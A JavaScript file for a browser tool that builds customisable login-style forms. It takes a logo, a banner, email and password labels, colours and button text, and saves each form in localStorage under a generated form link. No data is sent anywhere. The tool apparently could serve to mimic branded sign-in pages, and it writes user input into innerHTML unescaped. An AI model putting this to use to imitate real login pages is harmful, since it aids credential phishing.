// form-builder.js

function previewImage(input, previewId) {
  const preview = document.getElementById(previewId);
  const file = input.files[0];

  if (file) {
    const reader = new FileReader();
    reader.onload = () => {
      preview.innerHTML = `<img src="${reader.result}" style="max-width: 100%; max-height: 100px; border-radius: 6px;" />`;
      preview.setAttribute("data-image", reader.result);
    };
    reader.readAsDataURL(file);
  } else {
    preview.innerHTML = "NO IMAGE";
    preview.removeAttribute("data-image");
  }
}

document.querySelector('.generate-button').addEventListener('click', () => {
  let count = parseInt(localStorage.getItem("formCounter") || "1");
  const link = `form-${count}.html`;

  const data = {
    id: count,
    logo: document.getElementById("logoPreview").getAttribute("data-image") || null,
    logoSize: document.getElementById("logoSize").value,
    banner: document.getElementById("bannerPreview").getAttribute("data-image") || null,
    bannerSize: document.getElementById("bannerSize").value,
    templateName: document.getElementById("templateName").value,
    bodyColor: document.getElementById("bodyColor").value,
    buttonColor: document.getElementById("buttonColor").value,
    textColor: document.getElementById("textColor").value,
    description: document.getElementById("description").value,
    emailContent: document.getElementById("emailContent").value,
    emailLabel: document.getElementById("emailLabel").value,
    passwordContent: document.getElementById("passwordContent").value,
    passwordLabel: document.getElementById("passwordLabel").value,
    buttonContent: document.getElementById("buttonContent").value,
    buttonWidth: document.getElementById("buttonWidth").value,
    createdAt: new Date().toISOString(),
    formLink: link
  };

  localStorage.setItem(`form_${count}`, JSON.stringify(data));
  localStorage.setItem("formCounter", count + 1);

  const linkDiv = document.getElementById("generatedLink");
  linkDiv.style.display = "block";
  linkDiv.innerHTML = `
    🔗 Form link: <a href="${link}" target="_blank">${link}</a><br/><br/>
    <button onclick="editForm(${count})">✏️ Edit</button>
    <button onclick="deleteForm(${count})">🗑️ Delete</button>
  `;
});

function editForm(id) {
  const formData = JSON.parse(localStorage.getItem(`form_${id}`));
  if (!formData) return alert("Form not found!");

  document.getElementById("logoSize").value = formData.logoSize;
  document.getElementById("bannerSize").value = formData.bannerSize;
  document.getElementById("templateName").value = formData.templateName;
  document.getElementById("bodyColor").value = formData.bodyColor;
  document.getElementById("buttonColor").value = formData.buttonColor;
  document.getElementById("textColor").value = formData.textColor;
  document.getElementById("description").value = formData.description;
  document.getElementById("emailContent").value = formData.emailContent;
  document.getElementById("emailLabel").value = formData.emailLabel;
  document.getElementById("passwordContent").value = formData.passwordContent;
  document.getElementById("passwordLabel").value = formData.passwordLabel;
  document.getElementById("buttonContent").value = formData.buttonContent;
  document.getElementById("buttonWidth").value = formData.buttonWidth;

  if (formData.logo) {
    document.getElementById("logoPreview").innerHTML = `<img src="${formData.logo}" style="max-width: 100%; max-height: 100px; border-radius: 6px;" />`;
    document.getElementById("logoPreview").setAttribute("data-image", formData.logo);
  }

  if (formData.banner) {
    document.getElementById("bannerPreview").innerHTML = `<img src="${formData.banner}" style="max-width: 100%; max-height: 100px; border-radius: 6px;" />`;
    document.getElementById("bannerPreview").setAttribute("data-image", formData.banner);
  }

  const linkDiv = document.getElementById("generatedLink");
  linkDiv.style.display = "block";
  linkDiv.innerHTML = `
    ✏️ Editing form: <strong>${formData.formLink}</strong><br/><br/>
    <button onclick="overwriteForm(${id})">💾 Save Changes</button>
    <button onclick="deleteForm(${id})">🗑️ Delete</button>
  `;
}

function overwriteForm(id) {
  const updatedData = {
    id,
    logo: document.getElementById("logoPreview").getAttribute("data-image") || null,
    logoSize: document.getElementById("logoSize").value,
    banner: document.getElementById("bannerPreview").getAttribute("data-image") || null,
    bannerSize: document.getElementById("bannerSize").value,
    templateName: document.getElementById("templateName").value,
    bodyColor: document.getElementById("bodyColor").value,
    buttonColor: document.getElementById("buttonColor").value,
    textColor: document.getElementById("textColor").value,
    description: document.getElementById("description").value,
    emailContent: document.getElementById("emailContent").value,
    emailLabel: document.getElementById("emailLabel").value,
    passwordContent: document.getElementById("passwordContent").value,
    passwordLabel: document.getElementById("passwordLabel").value,
    buttonContent: document.getElementById("buttonContent").value,
    buttonWidth: document.getElementById("buttonWidth").value,
    createdAt: new Date().toISOString(),
    formLink: `form-${id}.html`
  };

  localStorage.setItem(`form_${id}`, JSON.stringify(updatedData));

  const linkDiv = document.getElementById("generatedLink");
  linkDiv.innerHTML = `✅ Saved changes to: <a href="${updatedData.formLink}" target="_blank">${updatedData.formLink}</a>`;
}

function deleteForm(id) {
  if (!confirm("Are you sure you want to delete this form?")) return;
  localStorage.removeItem(`form_${id}`);

  const linkDiv = document.getElementById("generatedLink");
  linkDiv.style.display = "block";
  linkDiv.innerHTML = `❌ Form ID ${id} deleted.`;
                                         }
